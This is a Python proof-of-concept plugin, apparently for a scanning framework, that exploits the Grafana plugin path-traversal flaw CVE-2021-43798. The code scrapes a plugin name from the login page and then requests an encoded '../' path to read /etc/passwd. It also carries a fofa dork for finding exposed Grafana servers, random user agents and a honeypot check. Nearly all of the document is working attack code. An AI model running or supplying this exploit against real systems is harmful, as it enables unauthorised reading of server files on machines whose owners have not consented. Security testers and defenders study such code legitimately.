# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
import re
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            这个POC其实应该根据插件名来做，目前比较好的两种方法分别是字典爆破插件名和login页面js代码中寻找插件链接提取插件名。
            可以参考[grafana最新任意文件读取分析以及衍生问题解释](https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw)
            这里笔者采用的是第二种方法
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Grafana plugins 任意文件读取漏洞(CVE-2021-43798)",                        # 漏洞名称
        "VulnID" : "CVE-2021-43798",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Grafana",                     # 漏洞应用名称
        "AppVersion" : "Grafana 8.x",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Grafana存在任意文件读取漏洞，通过默认存在的插件，可构造特殊的请求包读取服务器任意文件
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="Grafana"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url0,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "\"baseUrl\":\"public/app/plugins/panel/" in req0.text and req0.status_code==200:
                plugin = re.search("\"public/app/plugins/panel/(\w+)\"",req0.text).group(1)
                if len(plugin)!=0:
                    url1 = self.target + "/public/plugins/"+plugin+"/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd" # url自己按需调整
                    req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                    if req1.status_code==200 and "root:/root" in req1.text:
                        vuln = [True,req1.text]
                    else:
                        vuln = [False,req1.text]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()
